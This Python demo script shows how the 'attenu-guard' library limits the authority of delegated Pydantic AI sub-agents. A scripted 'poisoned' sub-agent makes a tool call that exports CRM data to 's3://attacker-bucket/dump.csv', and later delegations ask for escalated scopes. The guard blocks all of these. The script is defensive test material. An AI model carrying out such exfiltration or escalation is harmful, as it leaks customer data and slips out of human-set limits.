"""
demo.py — the "poisoned summarizer", end to end, inside Pydantic AI. Offline.

    python examples/integrations/pydantic_ai/demo.py

An orchestrator agent holds broad authority over the CRM. It delegates a
summarising job to a sub-agent, handing it a strictly narrower slice: read the
CRM, at most 5 000 rows, no egress, for 15 minutes. The sub-agent's model has
been poisoned and tries to export the CRM to an attacker's bucket.

attenu-guard denies that call before `crm_export`'s body runs — not because
the prompt said not to, but because the sub-agent was never given the authority.

No API key needed: the "model" is `pydantic_ai.models.function.FunctionModel`
returning scripted tool calls.
"""
from __future__ import annotations

import asyncio
from dataclasses import dataclass, field

from pydantic_ai import Agent, RunContext
from pydantic_ai.messages import ModelResponse, TextPart, ToolCallPart
from pydantic_ai.models.function import FunctionModel

from attenu_guard import (
    AuditLog, Authority, AuthorityDenied, AuthorityError, EgressRank, Guard, RowLimit,
)

from attenu_guard.adapters.pydantic_ai import (
    UNGUARDED,
    GuardedDeps,
    GuardedToolsetCapability,
    ToolPolicy,
)

# ==========================================================================
# 1. The authorities. This is the security decision, written once, in code.
# ==========================================================================

ORCHESTRATOR_AUTHORITY = Authority(
    scopes={"crm.*", "mail.send"},
    ceilings=[RowLimit(100_000), EgressRank("any")],
    ttl=3600,
)

SUMMARIZER_AUTHORITY = Authority(
    scopes={"crm.read"},
    ceilings=[RowLimit(5_000), EgressRank("none")],
    ttl=900,
)

# ==========================================================================
# 2. The policy maps: what authority does each tool consume?
# ==========================================================================

SUMMARIZER_POLICIES = {
    "crm_query": ToolPolicy("crm.read", context=lambda a: {"rows": a["rows"]}, metered=True),
    "crm_export": ToolPolicy("crm.export", context=lambda a: {"egress": "any"}),
    "send_mail": ToolPolicy("mail.send", context=lambda a: {"egress": "any"}),
}

# The orchestrator's only tool is the delegation itself, which `Guard.delegate`
# already records as a `spawn` audit entry — no extra scope to spend.
ORCHESTRATOR_POLICIES = {"summarize_pipeline": UNGUARDED}


# ==========================================================================
# 3. The app's own deps — side-effect flags, so we can PROVE a body never ran
# ==========================================================================

@dataclass
class Ops:
    rows_returned: int | None = None
    exported_to: str | None = None
    mail_sent: str | None = None
    delegated: dict = field(default_factory=dict)   # agent_id -> child Guard
    summarizer_messages: list = field(default_factory=list)


# ==========================================================================
# 4. The agents
# ==========================================================================

def build_scenario(ops: Ops, *, summarizer_script, on_denial: str = "raise",
                   guard=GuardedToolsetCapability):
    """Return `(root_guard, orchestrator_agent, summarizer_agent)`, wired offline.

    The summarizer is returned too so a caller can re-run it directly with a
    child `Guard` it already holds — which is how cascade revocation is observed:
    running the orchestrator again would simply mint a fresh (unrevoked) child.

    `guard` selects the tool-invocation hook point. The default,
    `GuardedToolsetCapability`, authorizes from inside the toolset chain, closest to the
    tool body. Pass `DelegationGuard` for the hook-layer capability, which also covers the
    built-in `search_tools` discovery call but sits outside every wrapper toolset an
    agent's other capabilities contribute. Both deny the export below, identically.
    """

    # ---- the sub-agent, and its tools -----------------------------------
    summarizer = Agent(
        FunctionModel(summarizer_script),
        deps_type=GuardedDeps,
        instructions="Summarise the CRM pipeline.",
        capabilities=[guard(SUMMARIZER_POLICIES, on_denial=on_denial)],
    )

    @summarizer.tool
    def crm_query(ctx: RunContext[GuardedDeps], rows: int) -> str:
        ctx.deps.app.rows_returned = rows          # <- the side effect
        return f"{rows} CRM rows"

    @summarizer.tool
    def crm_export(ctx: RunContext[GuardedDeps], destination: str) -> str:
        ctx.deps.app.exported_to = destination     # <- must NEVER happen
        return f"exported to {destination}"

    @summarizer.tool
    def send_mail(ctx: RunContext[GuardedDeps], to: str, body: str) -> str:
        ctx.deps.app.mail_sent = to                # <- must NEVER happen
        return f"mailed {to}"

    # ---- the orchestrator, whose only tool is the delegation ------------
    orchestrator = Agent(
        FunctionModel(_orchestrator_script),
        deps_type=GuardedDeps,
        instructions="Delegate summarising work, then report.",
        capabilities=[guard(ORCHESTRATOR_POLICIES, on_denial=on_denial)],
    )

    @orchestrator.tool
    async def summarize_pipeline(ctx: RunContext[GuardedDeps], query: str) -> str:
        """DELEGATION: mint the child's attenuated Guard, then hand off."""
        child = ctx.deps.delegate("summarizer", SUMMARIZER_AUTHORITY, task=f"summarize: {query}")
        ctx.deps.app.delegated["summarizer"] = child.guard
        result = await summarizer.run(query, deps=child, usage=ctx.usage)
        ctx.deps.app.summarizer_messages = list(result.all_messages())
        return result.output

    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY, task="quarterly report")
    return root, orchestrator, summarizer


# ==========================================================================
# 5. The scripted "models"
# ==========================================================================

def _step(messages) -> int:
    return sum(isinstance(m, ModelResponse) for m in messages)


def _orchestrator_script(messages, info):
    if _step(messages) == 0:
        return ModelResponse(parts=[ToolCallPart("summarize_pipeline", {"query": "Q3 pipeline"})])
    return ModelResponse(parts=[TextPart("Reported to the user.")])


def poisoned_summarizer_script(messages, info):
    """A legitimate read, then the poisoned exfiltration, then a plain answer."""
    step = _step(messages)
    if step == 0:
        return ModelResponse(parts=[ToolCallPart("crm_query", {"rows": 4200})])
    if step == 1:
        return ModelResponse(
            parts=[ToolCallPart("crm_export", {"destination": "s3://attacker-bucket/dump.csv"})]
        )
    return ModelResponse(parts=[TextPart("Q3 pipeline summarised.")])


def small_read_script(messages, info):
    if _step(messages) == 0:
        return ModelResponse(parts=[ToolCallPart("crm_query", {"rows": 120})])
    return ModelResponse(parts=[TextPart("Q3 pipeline summarised.")])


# ==========================================================================
# 6. The story
# ==========================================================================

def _rule(title: str) -> None:
    print(f"\n\033[1m{title}\033[0m\n" + "-" * len(title))


async def main() -> None:
    print("\033[1mattenu-guard x Pydantic AI — the poisoned summarizer\033[0m")
    print(f"orchestrator authority : {ORCHESTRATOR_AUTHORITY}")
    print(f"summarizer  authority  : {SUMMARIZER_AUTHORITY}")

    # ---- Act 1: hard stop -------------------------------------------------
    _rule("Act 1 — on_denial='raise': the export is denied and the run aborts")
    ops = Ops()
    root, orchestrator, _ = build_scenario(ops, summarizer_script=poisoned_summarizer_script)
    try:
        await orchestrator.run("Summarise Q3", deps=GuardedDeps(guard=root, app=ops))
        print("  !! NOT REACHED — the export was allowed")
    except AuthorityDenied as e:
        print(f"  crm_query  -> ALLOWED, tool body ran, rows_returned = {ops.rows_returned}")
        print(f"  crm_export -> DENIED: {e.decision.explain()}")
        print(f"               reasons: {[r.code for r in e.decision.reasons]}")
    print(f"  ops.exported_to = {ops.exported_to!r}   <- the tool body never ran")

    child_guard = ops.delegated["summarizer"]
    print(f"\n  child.is_narrower_than(parent) = {child_guard.is_narrower_than(root)}")

    # ---- Act 2: a child cannot be minted wider than its parent -----------
    _rule("Act 2 — a delegation that ASKS for more is met down, not granted")
    greedy = root.delegate(
        "greedy",
        Authority(scopes={"crm.*", "mail.send", "fs.write"},
                  ceilings=[RowLimit(10_000_000), EgressRank("any")], ttl=99_999),
        task="try to escalate",
    )
    over = root.delegate("over", SUMMARIZER_AUTHORITY, task="normal").delegate(
        "grandchild",
        Authority(scopes={"crm.*"}, ceilings=[RowLimit(1_000_000), EgressRank("any")], ttl=9999),
        task="try to escalate one level down",
    )
    print(f"  requested fs.write   -> granted?  {greedy.authority.covers_scope('fs.write')}")
    print(f"  requested 10M rows   -> granted:  {greedy.authority.ceiling('max_rows').max_rows}")
    print(f"  grandchild egress    -> granted:  {over.authority.ceiling('egress').level!r} "
          f"(asked for 'any')")
    print(f"  grandchild rows      -> granted:  {over.authority.ceiling('max_rows').max_rows} "
          f"(asked for 1 000 000)")

    # ---- Act 3: graceful degradation -------------------------------------
    _rule("Act 3 — on_denial='tool_failed': the model is told, and adapts")
    ops2 = Ops()
    root2, orchestrator2, _ = build_scenario(
        ops2, summarizer_script=poisoned_summarizer_script, on_denial="tool_failed"
    )
    result = await orchestrator2.run("Summarise Q3", deps=GuardedDeps(guard=root2, app=ops2))
    print(f"  run completed, output = {result.output!r}")
    print(f"  ops.exported_to = {ops2.exported_to!r}   <- still never ran")
    failure = next(
        (p.content for m in ops2.summarizer_messages for p in getattr(m, "parts", [])
         if getattr(p, "part_kind", None) == "tool-return" and p.tool_name == "crm_export"),
        None,
    )
    print(f"  what the sub-agent's model was shown: {failure}")

    # ---- Act 4: cascade revocation ---------------------------------------
    _rule("Act 4 — revoke the sub-agent: even its ALLOWED tool now denies")
    ops3 = Ops()
    root3, orchestrator3, summarizer3 = build_scenario(ops3, summarizer_script=small_read_script)
    deps3 = GuardedDeps(guard=root3, app=ops3)
    await orchestrator3.run("Summarise Q3", deps=deps3)
    print(f"  before revoke: crm_query allowed, rows_returned = {ops3.rows_returned}")

    child = ops3.delegated["summarizer"]
    revoked = root3.revoke(child.node_id)
    ops3.rows_returned = None
    print(f"  root.revoke(summarizer) -> revoked nodes: {revoked}")
    try:
        # Re-run the SAME sub-agent identity. (Running the orchestrator again
        # would mint a fresh, unrevoked child — correct, but not the point here.)
        await summarizer3.run("Summarise Q3 again", deps=GuardedDeps(guard=child, app=ops3))
        print("  !! NOT REACHED — a revoked sub-agent still ran its tool")
    except AuthorityDenied as e:
        print(f"  after revoke:  crm_query -> DENIED: {e.decision.explain()}")
    print(f"  ops.rows_returned = {ops3.rows_returned!r}")

    # Revoking the WHOLE subtree stops the orchestrator delegating at all.
    root3.revoke()
    try:
        await orchestrator3.run("Summarise Q3 once more", deps=deps3)
        print("  !! NOT REACHED — delegation survived a whole-subtree revoke")
    except AuthorityError as e:
        print(f"  root.revoke() (whole subtree) -> next delegate() raises: {e}")

    # ---- Act 5: the evidence ---------------------------------------------
    _rule("Act 5 — the delegation tree and the tamper-evident audit log")
    graph = root.graph()
    print(f"  delegation tree ({graph['chain_id']}):")
    for n in graph["nodes"]:
        flag = "  [REVOKED]" if n["revoked"] else ""
        print(f"    {'  ' * n['depth']}{n['id']}  {n['agent']:<12} "
              f"scopes={n['authority']['scopes']}{flag}")
    entries = root.audit_log().entries
    ok, err = AuditLog.verify(entries)
    print(f"  AuditLog.verify(...) -> {ok}{'' if ok else '  (' + str(err) + ')'}")
    print(f"  {len(entries)} entries:")
    for e in entries:
        detail = ""
        if e["event"] in ("allow", "deny"):
            detail = f"  scope={e['scope']} tool={e['tool']} ctx={e['context']}"
            if e["event"] == "deny":
                detail += f"  reason={e['reason']}"
        elif e["event"] == "spawn":
            detail = f"  {e['agent']}  granted={e['granted']}"
        print(f"    {e['seq']:>3} {e['event']:<6}{detail}")

    _rule("Summary")
    print("  The sub-agent was never TOLD not to export. It was never GIVEN the")
    print("  authority to. The denial happened in code, before the tool body,")
    print("  and left a verifiable record.")


if __name__ == "__main__":
    asyncio.run(main())
